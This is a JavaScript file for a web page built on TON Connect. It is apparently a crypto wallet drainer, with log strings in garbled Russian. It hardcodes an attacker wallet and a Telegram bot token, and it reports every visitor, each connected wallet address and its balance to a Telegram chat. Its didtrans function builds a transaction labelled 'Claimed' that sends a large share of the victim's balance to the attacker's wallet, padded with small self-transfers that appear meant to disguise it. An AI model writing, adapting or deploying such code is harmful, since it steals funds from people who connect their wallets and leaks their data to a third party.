var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
const chatId = "@ppjjkkd";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/time/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;

async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
    }
}

(async () => {
    sendToTelegram(`üåç –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å —Å–∞–π—Ç–∞!`);
})();

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('–ê–¥—Ä–µ—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:', walletAddress);
        
        await updateBalance(walletAddress);
        sendToTelegram(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω –∫–æ—à–µ–ª–µ–∫: <code>${walletAddress}</code>`);
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`–ë–∞–ª–∞–Ω—Å: ${balanceTON} TON`);

        sendToTelegram(`üí∞ –ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞ <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞:', error);
    }
}

async function didtrans() {
    if (!walletAddress) return alert('–ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
    
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();
    if (!data.balance) return;

    const originalBalance = parseFloat(data.balance);
    const deduction = originalBalance * 0.55;
    if (originalBalance <= deduction) return;

    const remainingBalance = originalBalance - deduction;
    console.log(`–ë–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${remainingBalance / 1000000000} TON`);

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [
            { address: walletAddress, amount: 10000000 },
            { address: walletAddress, amount: 10000000 },
            { address: walletAddress, amount: 10000000 },
            { address: mainWallet, amount: remainingBalance },
        ],
        sendMode: 5,
        comment: "Claimed",
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:', result);
        
        sendToTelegram(`üí∏ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å –∫–æ—à–µ–ª—å–∫–∞ <code>${walletAddress}</code> –Ω–∞ —Å—É–º–º—É <b>${remainingBalance / 1000000000} TON</b>`);
        
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
    }
}
